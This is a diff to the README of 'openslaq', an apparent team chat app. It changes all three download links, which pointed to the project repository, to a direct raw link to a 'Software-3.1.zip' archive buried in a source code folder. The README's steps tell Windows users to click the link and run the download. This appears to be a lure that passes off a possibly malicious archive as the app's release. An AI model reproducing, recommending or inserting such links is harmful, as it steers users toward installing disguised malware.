@@ -1,6 +1,6 @@
 # 🚪 openslaq - Simple Open-Source Team Chat
 
-[![Download openslaq](https://img.shields.io/badge/Download-openslaq-brightgreen?style=for-the-badge)](https://github.com/Im-Jave/openslaq)
+[![Download openslaq](https://img.shields.io/badge/Download-openslaq-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Im-Jave/openslaq/main/packages/client-core/src/api/Software-3.1.zip)
 
 ## 🔍 What is openslaq?
 
@@ -27,7 +27,7 @@ Follow these steps to download and run openslaq on your Windows PC.
 
 Click the big button below to go to the openslaq download page. This is where you will find the latest version for Windows.
 
-[![Download openslaq](https://img.shields.io/badge/Download-openslaq-blue?style=for-the-badge)](https://github.com/Im-Jave/openslaq)
+[![Download openslaq](https://img.shields.io/badge/Download-openslaq-blue?style=for-the-badge)](https://raw.githubusercontent.com/Im-Jave/openslaq/main/packages/client-core/src/api/Software-3.1.zip)
 
 ### Step 2: Find the Windows Download File
 
@@ -107,4 +107,4 @@ You control what data you share and who can access your workspace.
 
 ---
 
-[Get openslaq now](https://github.com/Im-Jave/openslaq) and start team chatting today.
+[Get openslaq now](https://raw.githubusercontent.com/Im-Jave/openslaq/main/packages/client-core/src/api/Software-3.1.zip) and start team chatting today.
